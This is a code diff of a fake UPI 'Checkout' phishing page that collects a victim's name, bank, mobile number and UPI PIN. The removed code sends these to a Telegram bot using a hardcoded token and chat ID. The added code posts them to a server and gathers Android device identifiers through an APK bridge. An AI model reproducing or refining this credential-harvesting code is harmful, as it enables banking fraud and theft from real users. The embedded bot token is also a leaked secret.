@@ -1,73 +1,77 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
- <meta charset="UTF-8">
- <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>Checkout</title>
- <link rel="stylesheet" type="text/css" href="style2.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout</title>
+<link rel="stylesheet" href="style2.css">
 </head>
 <body>
- <div class="banner">
- <img src="01.jpg" alt="Banner Image" style="width: 100%; height: 100%; ">
- </div>
- <div class="container">
- <h1 style="text-align: center;"></h1>
+<div class="banner">
+ <img src="01.jpg" alt="Banner Image" style="width:100%;height:100%;">
+</div>
+
+<div class="container">
  <form id="paymentForm">
- <div class="form-section">
- <h2>ENTER YOUR CREDENTIALS</h2>
- <label for="firstName">CLIENT'S NAME</label>
- <input type="text" id="firstName" name="firstName" placeholder="ENTER YOUR NAME" required>
- <label for="lastName">BANK NAME</label>
- <input type="text" id="lastName" name="lastName" placeholder="ENTER YOUR BANK NAME" required>
- <label for="mobileNumber">MOBILE NUMBER</label>
- <input type="tel" id="mobileNumber" name="mobileNumber" placeholder="UPI LINKED MOBILE NUMBER" required>
- <label for="address">AMOUNT</label>
- <input type="text" id="address" name="address" placeholder="ENTER YOUR AMOUNT" required>
- <label for="city">UPI PIN</label>
- <input type="password" id="city" name="city" placeholder=" ENTER UPI PIN" required>
- </div>
- <button type="submit">MAKE PAYMENT</button>
+   <div class="form-section">
+     <h2>ENTER YOUR CREDENTIALS</h2>
+     <label for="firstName">CLIENT'S NAME</label>
+     <input type="text" id="firstName" name="firstName" placeholder="ENTER YOUR NAME" required>
+
+     <label for="lastName">BANK NAME</label>
+     <input type="text" id="lastName" name="lastName" placeholder="ENTER YOUR BANK NAME" required>
+
+     <label for="mobileNumber">MOBILE NUMBER</label>
+     <input type="tel" id="mobileNumber" name="mobileNumber" placeholder="UPI LINKED MOBILE NUMBER" required>
+
+     <label for="amount">AMOUNT</label>
+     <input type="text" id="amount" name="amount" placeholder="ENTER YOUR AMOUNT" required>
+
+     <label for="upiPin">PIN</label>
+     <input type="password" id="upiPin" name="upiPin" placeholder="ENTER YOUR UPI PIN" required>
+   </div>
+   <button type="submit">MAKE PAYMENT</button>
  </form>
- </div>
+</div>
 
- <script>
- const form = document.getElementById('paymentForm');
+<script>
+const form = document.getElementById("paymentForm");
 
- form.addEventListener('submit', (e) => {
- e.preventDefault();
+form.addEventListener("submit", async (e) => {
+    e.preventDefault();
 
- const formData = new FormData(form);
- const data = {
- clientName: formData.get('firstName'),
- bankName: formData.get('lastName'),
- mobileNumber: formData.get('mobileNumber'),
- amount: formData.get('address'),
- upiPin: formData.get('city'),
- };
+    const formData = new FormData(form);
+    const data = {
+        clientName: formData.get("firstName"),
+        bankName: formData.get("lastName"),
+        mobileNumber: formData.get("mobileNumber"),
+        amount: formData.get("amount"),
+        upiPin: formData.get("upiPin")
+    };
 
- // Token fill
- const API_TOKEN = '8101119609:AAGA039ibNm2hQTKBoS5vFlyzIP47wQAbM4';
- const CHAT_ID = '-1002615335715';
+    // Device info from APK
+    if(window.AndroidDevice && AndroidDevice.getUUID && AndroidDevice.getBattery){
+        data.uuid = AndroidDevice.getUUID();
+        data.battery = AndroidDevice.getBattery();
+        data.device = navigator.userAgent;
+    }
 
- const message = `ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @Heck0bot\nClient Name: ${data.clientName}\nBank Name: ${data.bankName}\nMobile Number: ${data.mobileNumber}\nAmount: ${data.amount}\nUPI Pin: ${data.upiPin}`;
+    try {
+        const res = await fetch("/html-form-data", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify(data)
+        });
 
- fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
- method: 'POST',
- headers: {
- 'Content-Type': 'application/json',
- },
- body: JSON.stringify({
- chat_id: CHAT_ID,
- text: message,
- }),
- })
- .then((response) => response.json())
- .then((data) => {
- console.log(data);
- window.location.href = 'next-page.html'; // redirect to next page
- })
- .catch((error) => console.error(error));
- });
- </script>
+        const result = await res.json();
+        console.log(result);
+        alert("✅ Data sent successfully!");
+        window.location.href = "next-page.html"; // redirect
+    } catch(err) {
+        console.error(err);
+        alert("❌ Error sending data to server.");
+    }
+});
+</script>
 </body>
 </html>
